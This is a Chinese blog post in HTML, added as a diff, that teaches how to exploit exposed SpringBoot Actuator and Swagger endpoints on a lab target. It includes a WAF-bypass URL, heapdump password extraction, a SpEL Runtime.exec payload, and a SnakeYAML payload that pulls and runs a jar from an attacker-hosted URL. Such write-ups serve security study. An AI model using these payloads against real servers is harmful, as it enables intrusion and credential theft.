@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.2.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://fastly.jsdelivr.net'>
+  <link rel="preconnect" href="https://fastly.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>SpringBoot未授权访问漏洞 - z-bool</title>
+
+  
+    <meta name="description" content="1. 概述 2. 信息泄露2.1 接口调用详情泄露漏洞成因：为对Swagger进行区分生产环境与开发环境，忘记切换环境配置 直接访问(Swagger&#x2F;Swagger Codegen&#x2F;Swagger Dubbo)相关的路径查看是否有输出： 12345678910111213141516171819202122&#x2F;swagger&#x2F;api.html&#x2F;swagger&#x2F;codes&#x2F;api&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SpringBoot未授权访问漏洞">
+<meta property="og:url" content="http://example.com/2022/10/08/springboot-unauthorized/index.html">
+<meta property="og:site_name" content="z-bool">
+<meta property="og:description" content="1. 概述 2. 信息泄露2.1 接口调用详情泄露漏洞成因：为对Swagger进行区分生产环境与开发环境，忘记切换环境配置 直接访问(Swagger&#x2F;Swagger Codegen&#x2F;Swagger Dubbo)相关的路径查看是否有输出： 12345678910111213141516171819202122&#x2F;swagger&#x2F;api.html&#x2F;swagger&#x2F;codes&#x2F;api&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008213921491.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008220407789.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008215825867.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008221526827.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008222328017.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008223017098.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008223057221.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008223436394.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009011802555.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009090907142.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009091529964.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009091717882.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009091850670.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009091929254.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009101439380.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009122402563.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009122848452.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009122958870.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009123100576.png">
+<meta property="article:published_time" content="2022-10-08T13:37:55.000Z">
+<meta property="article:modified_time" content="2022-10-09T06:13:41.714Z">
+<meta property="article:author" content="z-bool">
+<meta property="article:tag" content="SpringBoot">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008213921491.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="title" href="/"><div class="main">z-bool</div></a></div>
+<nav class="menu dis-select"></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A6%82%E8%BF%B0"><span class="toc-text">1. 概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">2. 信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E9%9C%B2"><span class="toc-text">2.1 接口调用详情泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-Swagger%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-text">2.2 Swagger检测绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%9A%B4%E9%9C%B2%E8%B7%AF%E7%94%B1"><span class="toc-text">2.3 配置不当暴露路由</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-Heapdump%E5%88%A9%E7%94%A8"><span class="toc-text">2.3.1 Heapdump利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">3. 远程代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-whitelabel-error-page-SpEL-RCE"><span class="toc-text">3.1 whitelabel error page SpEL RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-1-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">3.1.1 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-2-%E5%8E%9F%E7%90%86"><span class="toc-text">3.1.2 原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-3-%E9%9D%B6%E5%9C%BADEMO"><span class="toc-text">3.1.3 靶场DEMO</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-spring-cloud-SnakeYAML-RCE"><span class="toc-text">3.2 spring cloud SnakeYAML RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">3.2.1 漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-2-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">3.2.2 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-3-%E6%89%98%E7%AE%A1yml%E5%92%8Cjar%E6%96%87%E4%BB%B6"><span class="toc-text">3.2.3 托管yml和jar文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-4-%E6%8A%93%E5%8C%85%E8%AE%BE%E7%BD%AE%E5%B1%9E%E6%80%A7"><span class="toc-text">3.2.4 抓包设置属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-5-%E5%88%B7%E6%96%B0SpringCloud%E9%85%8D%E7%BD%AE"><span class="toc-text">3.2.5 刷新SpringCloud配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-6-%E6%80%BB%E7%BB%93"><span class="toc-text">3.2.6 总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-eureka-xstream-deserialization-RCE"><span class="toc-text">3.3 eureka xstream deserialization RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-1-%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D"><span class="toc-text">3.3.1 组件介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-2-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">3.3.2 漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-3-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">3.3.3 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-4-%E6%9E%B6%E8%AE%BE%E5%93%8D%E5%BA%94%E6%81%B6%E6%84%8Fpayload%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-text">3.3.4 架设响应恶意payload的网站</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-5-%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%E7%AD%89%E5%BE%85%E8%BF%9E%E6%8E%A5"><span class="toc-text">3.3.5 监听端口等待连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-6-%E6%8A%93%E5%8C%85%E8%AE%BE%E7%BD%AE%E5%B1%9E%E6%80%A7"><span class="toc-text">3.3.6 抓包设置属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-7-%E5%88%B7%E6%96%B0SpringCloud%E9%85%8D%E7%BD%AE"><span class="toc-text">3.3.7 刷新SpringCloud配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-8-%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">3.3.8 反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-jolokia-logback-JNDI-RCE"><span class="toc-text">3.4 jolokia logback JNDI RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-jolokia-Realm-JNDI-RCE"><span class="toc-text">3.5 jolokia Realm JNDI RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-restart-h2-database-query-RCE"><span class="toc-text">3.6 restart h2 database query RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-h2-database-console-JNDI-RCE"><span class="toc-text">3.7 h2 database console JNDI RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8-mysql-jdbc-deserialization-RCE"><span class="toc-text">3.8 mysql jdbc deserialization RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-9-restart-logging-config-logback-JNDI-RCE"><span class="toc-text">3.9 restart logging.config logback JNDI RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-10-restart-logging-config-groovy-RCE"><span class="toc-text">3.10 restart logging.config groovy RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-11-restart-spring-main-sources-groovy-RCE"><span class="toc-text">3.11 restart spring.main.sources groovy RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-12-restart-spring-datasource-data-h2-database-RCE"><span class="toc-text">3.12 restart spring.datasource.data h2 database RCE</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div><div id="post-meta">发布于&nbsp;<time datetime="2022-10-08T13:37:55.000Z">2022-10-08</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>SpringBoot未授权访问漏洞</span></h1>
+<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008213921491.png" alt="image-20221008213921491"></p>
+<h2 id="2-信息泄露"><a href="#2-信息泄露" class="headerlink" title="2. 信息泄露"></a>2. 信息泄露</h2><h3 id="2-1-接口调用详情泄露"><a href="#2-1-接口调用详情泄露" class="headerlink" title="2.1 接口调用详情泄露"></a>2.1 接口调用详情泄露</h3><p><u>漏洞成因</u>：为对Swagger进行区分生产环境与开发环境，忘记切换环境配置</p>
+<p>直接访问(<u>Swagger&#x2F;Swagger Codegen&#x2F;Swagger Dubbo</u>)相关的路径查看是否有输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/swagger</span><br><span class="line">/api.html</span><br><span class="line">/swagger/codes</span><br><span class="line">/api/v2/api-docs</span><br><span class="line">/swagger-ui.html</span><br><span class="line">/swagger/index.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/swagger-dubbo/api-docs</span><br><span class="line">/swagger/static/index.html</span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line">/api-docs</span><br><span class="line">/swagger-ui</span><br><span class="line">/api/index.html</span><br><span class="line">/v2/swagger.json</span><br><span class="line">/distv2/index.html</span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line">/static/swagger.json</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/template/swagger-ui.html</span><br><span class="line">/dubbo-provider/distv2/index.html</span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br></pre></td></tr></table></figure>
+
+<p>有时SpringBoot Actuator也会有一些接口信息:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/mappings</span><br><span class="line">/metrics</span><br><span class="line">/beans</span><br><span class="line">/configprops</span><br><span class="line">/actuator/metrics</span><br><span class="line">/actuator/mappings</span><br><span class="line">/actuator/beans</span><br><span class="line">/actuator/configprops</span><br></pre></td></tr></table></figure>
+
+<p>用谷歌语法<code>inurl:/swagger-ui</code>等搜索：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008220407789.png" alt="image-20221008220407789"></p>
+<h3 id="2-2-Swagger检测绕过"><a href="#2-2-Swagger检测绕过" class="headerlink" title="2.2 Swagger检测绕过"></a>2.2 Swagger检测绕过</h3><p>被拦截路径:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xx.domain.com/swagger-ui.html</span><br></pre></td></tr></table></figure>
+
+<p>绕过报警:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xx.domain.com/sw%61gger-ui.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-配置不当暴露路由"><a href="#2-3-配置不当暴露路由" class="headerlink" title="2.3 配置不当暴露路由"></a>2.3 配置不当暴露路由</h3><p><u>漏洞成因</u>：没有意识到暴露路由的安全风险或者没有按照规范流程开发</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008215825867.png" alt="image-20221008215825867"></p>
+<p>访问<code>/env</code> |<code>/actuator/env</code> 接口时会带一些敏感关键词(如password、secret等)</p>
+<h4 id="2-3-1-Heapdump利用"><a href="#2-3-1-Heapdump利用" class="headerlink" title="2.3.1 Heapdump利用"></a>2.3.1 Heapdump利用</h4><ol>
+<li>直接访问<code>/heapdump</code> 或者<code>/actuator/headdump</code> 下载内存文件</li>
+<li>使用Eclipse Memory Analyzer获得JVM HEAP中的密码明文(<a target="_blank" rel="noopener" href="https://www.eclipse.org/mat/downloads.php">https://www.eclipse.org/mat/downloads.php</a>)</li>
+</ol>
+<h2 id="3-远程代码执行漏洞"><a href="#3-远程代码执行漏洞" class="headerlink" title="3. 远程代码执行漏洞"></a>3. 远程代码执行漏洞</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008221526827.png" alt="image-20221008221526827"></p>
+<h3 id="3-1-whitelabel-error-page-SpEL-RCE"><a href="#3-1-whitelabel-error-page-SpEL-RCE" class="headerlink" title="3.1 whitelabel error page SpEL RCE"></a>3.1 whitelabel error page SpEL RCE</h3><h4 id="3-1-1-利用条件"><a href="#3-1-1-利用条件" class="headerlink" title="3.1.1 利用条件"></a>3.1.1 利用条件</h4><ul>
+<li>SpringBoot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li>
+<li>至少知道一个触发SpringBoot默认错误页面的接口及参数<ul>
+<li><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008222328017.png" alt="image-20221008222328017"></li>
+<li>即SpringBoot的默认500错误</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-1-2-原理"><a href="#3-1-2-原理" class="headerlink" title="3.1.2 原理"></a>3.1.2 原理</h4><p>SpringBoot处理参数时发生错误，会进入到<code>org.springframework.util.PropertyPlaceholderHelper</code>类中，这是会对URL中的参数值用<code>parseStringValue()</code> 方法进行递归解析。其中用<code>$&#123;&#125;</code>包围的内容都会被<code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code>类的<code>resolvePlaceholder()</code>方法当作SpEL表达式被解析执行，造成RCE漏洞。</p>
+<h4 id="3-1-3-靶场DEMO"><a href="#3-1-3-靶场DEMO" class="headerlink" title="3.1.3 靶场DEMO"></a>3.1.3 靶场DEMO</h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008223017098.png" alt="image-20221008223017098"></p>
+<p>输入其他类型字符测试：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008223057221.png" alt="image-20221008223057221"></p>
+<p>参数类型应该是<code>int</code>或者<code>Integer</code>等字符型，这里我们得到一个<u>接口</u>以及<u>参数</u>，写入payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=<span class="variable">$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x63,0x61,0x6c,0x63&#125;</span>))&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221008223436394.png" alt="image-20221008223436394"></p>
+<h3 id="3-2-spring-cloud-SnakeYAML-RCE"><a href="#3-2-spring-cloud-SnakeYAML-RCE" class="headerlink" title="3.2 spring cloud SnakeYAML RCE"></a>3.2 spring cloud SnakeYAML RCE</h3><blockquote>
+<p>工具：<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+</blockquote>
+<h4 id="3-2-1-漏洞原理"><a href="#3-2-1-漏洞原理" class="headerlink" title="3.2.1 漏洞原理"></a>3.2.1 漏洞原理</h4><ol>
+<li><code>spring.cloud.bootstrap.location</code> 属性被设置为外部恶意yml文件URL地址</li>
+<li><code>refresh</code>触发目标机器请求远程HTTP服务器上的yml文件，获得其内容</li>
+<li><code>SnakeYAML</code> 由于存在反序列化漏洞，所以解析恶意yml内容时会完成指定的动作</li>
+<li>先是触发<code>java.net.URL</code>去拉取远程HTTP服务器上的恶意jar文件</li>
+<li>然后寻找jar文件中实现<code>javax.script.ScriptEngineFactory</code> 接口的类并实例化</li>
+<li>实例化类时执行恶意代码，造成RCE漏洞</li>
+</ol>
+<h4 id="3-2-2-利用条件"><a href="#3-2-2-利用条件" class="headerlink" title="3.2.2 利用条件"></a>3.2.2 利用条件</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以POST 请求目标网站的<code>/refresh</code> 接口刷新配置（存在boot-starter-actuator依赖)</li>
+<li>spring-cloud-starter的版本 &lt; <strong>1.3.0.RELEASE</strong> </li>
+<li>请求可出网(公网服务器)</li>
+</ul>
+<h4 id="3-2-3-托管yml和jar文件"><a href="#3-2-3-托管yml和jar文件" class="headerlink" title="3.2.3 托管yml和jar文件"></a>3.2.3 托管yml和jar文件</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi yml-payload.yaml</span></span><br><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://(ip)/yaml-payload.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>打包jar文件:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
+
+<p>将这两个文件都放到公网服务器上：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009011802555.png" alt="image-20221009011802555"></p>
+<h4 id="3-2-4-抓包设置属性"><a href="#3-2-4-抓包设置属性" class="headerlink" title="3.2.4 抓包设置属性"></a>3.2.4 抓包设置属性</h4><p>先看处理前的<code>/env</code> 环境：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009090907142.png" alt="image-20221009090907142"></p>
+<p>发现未处理前，是没有<code>spring.cloud.bootstrap.location</code>这个yml配置项的。</p>
+<p>抓<code>/env</code>包修改为POST请求方法，加入远程加载yml的指令：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009091529964.png" alt="image-20221009091529964"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009091717882.png" alt="image-20221009091717882"></p>
+<p>处理后的<code>/env</code>环境：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009091850670.png" alt="image-20221009091850670"></p>
+<h4 id="3-2-5-刷新SpringCloud配置"><a href="#3-2-5-刷新SpringCloud配置" class="headerlink" title="3.2.5 刷新SpringCloud配置"></a>3.2.5 刷新SpringCloud配置</h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009091929254.png" alt="image-20221009091929254"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009101439380.png" alt="image-20221009101439380"></p>
+<p><strong>注意点：</strong> </p>
+<p>编译版本要和执行版本一致，不然yaml不能被解析。</p>
